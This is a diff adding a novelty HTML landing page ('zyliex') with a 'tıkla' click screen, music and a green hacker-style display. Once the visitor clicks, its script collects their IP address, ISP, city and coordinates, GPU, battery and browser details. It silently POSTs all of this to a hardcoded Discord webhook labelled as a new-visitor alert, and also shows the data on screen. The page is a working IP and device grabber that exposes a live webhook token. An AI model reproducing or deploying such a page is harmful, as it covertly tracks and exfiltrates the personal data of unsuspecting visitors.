@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>zyliex</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Courier New', monospace; background-color: #000; color: #00ff00; height: 100vh; overflow: hidden; }
+        
+        #entry-screen { 
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+            display: flex; justify-content: center; align-items: center; 
+            cursor: pointer; z-index: 100; background-color: #000; 
+        }
+        
+        #enter-text { 
+            font-size: 8em; font-weight: bold;
+            text-shadow: 0 0 20px #00ff00, 0 0 40px #00ff00;
+            animation: pulse 1.5s infinite; text-align: center; text-transform: uppercase;
+        }
+        
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
+        
+        #main-content { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; }
+        #background-gif { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; z-index: -1; opacity: 0.4; }
+        
+        #info-display { 
+            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); 
+            padding: 20px; white-space: pre; line-height: 1.4; text-align: center;
+        }
+        
+        .info-line { opacity: 0; animation: fadeInZoom 0.5s forwards; margin-bottom: 5px; }
+        @keyframes fadeInZoom { from { opacity: 0; transform: translateY(20px) scale(0.8); } to { opacity: 1; transform: translateY(0) scale(1); } }
+    </style>
+</head>
+<body>
+   
+    <div id="entry-screen">
+        <div id="enter-text">tıkla</div>
+    </div>
+
+    <div id="main-content">
+        <img id="background-gif" src="zyliex.gif" alt="Background">
+        <div id="info-display"></div>
+    </div>
+    
+    <audio id="background-music" loop>
+        <source src="zyliex.mp3" type="audio/mpeg">
+    </audio>
+
+    <script>
+        document.getElementById('entry-screen').addEventListener('click', async function() {
+            this.style.display = 'none';
+            document.getElementById('main-content').style.display = 'block';
+            
+            const music = document.getElementById('background-music');
+            music.volume = 0.5;
+            music.play().catch(e => console.log("Playback prevented:", e));
+            
+            const display = document.getElementById('info-display');
+            const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
+            const battery = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({ level: 1, charging: true }));
+            const connection = navigator.connection || {};
+            const now = new Date();
+
+            const infoLines = [
+                `--- NETWORK ---`,
+                `IP ADDRESS: ${ipData.ip}`,
+                `ISP: ${ipData.org}`,
+                `ASN: ${ipData.asn}`,
+                `LOCATION: ${ipData.city}, ${ipData.region}, ${ipData.country_name}`,
+                `LAT/LONG: ${ipData.latitude}, ${ipData.longitude}`,
+                `TIMEZONE: ${ipData.timezone}`,
+                `CONNECTION: ${connection.effectiveType || 'N/A'}`,
+                `DOWNLINK: ${connection.downlink || 'N/A'} Mbps`,
+                `--- HARDWARE ---`,
+                `CPU THREADS: ${navigator.hardwareConcurrency}`,
+                `GPU VENDOR: ${getGPUInfo('vendor')}`,
+                `GPU RENDERER: ${getGPUInfo('renderer')}`,
+                `RAM (JS HEAP): ${(performance.memory ? (performance.memory.totalJSHeapSize / 1048576).toFixed(0) + ' MB' : 'Restricted')}`,
+                `BATTERY: ${(battery.level * 100).toFixed(0)}%`,
+                `CHARGING: ${battery.charging ? 'YES' : 'NO'}`,
+                `--- BROWSER & SYSTEM ---`,
+                `USER AGENT: ${navigator.userAgent}`,
+                `PLATFORM: ${navigator.platform}`,
+                `LANGUAGE: ${navigator.language}`,
+                `COOKIES: ${navigator.cookieEnabled ? 'ENABLED' : 'DISABLED'}`,
+                `DO NOT TRACK: ${navigator.doNotTrack || 'Unknown'}`,
+                `SCREEN: ${screen.width}x${screen.height} (${screen.colorDepth}-bit)`,
+                `WINDOW: ${window.innerWidth}x${window.innerHeight}`,
+                `TIME: ${now.toLocaleString()}`
+            ];
+
+            fetch('https://discordapp.com/api/webhooks/1516629813337522298/qhB-GiRVtBCaUcwNWSygoM9pIazDRlIdSZExyh276OfEyEtCSEn3_bFUoOPhSyJYrnRJ', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: "🔍 **Yeni ziyaretçi**",
+                    embeds: [{ color: 0x00ff00, description: infoLines.join('\n') }]
+                })
+            });
+
+            let fontSize = 42;
+            infoLines.forEach((line, index) => {
+                setTimeout(() => {
+                    const lineElement = document.createElement('div');
+                    lineElement.className = 'info-line';
+                    lineElement.textContent = line;
+                    lineElement.style.fontSize = fontSize + "px";
+                    display.appendChild(lineElement);
+                    fontSize = Math.max(16, fontSize - 2);
+                }, index * 300);
+            });
+        });
+
+        function getGPUInfo(type) {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            if (!gl) return "Not supported";
+            const debug = gl.getExtension('WEBGL_debug_renderer_info');
+            return debug ? (type === 'vendor' ? gl.getParameter(debug.UNMASKED_VENDOR_WEBGL) : gl.getParameter(debug.UNMASKED_RENDERER_WEBGL)) : "Unknown";
+        }
+    </script>
+</body>
+</html>
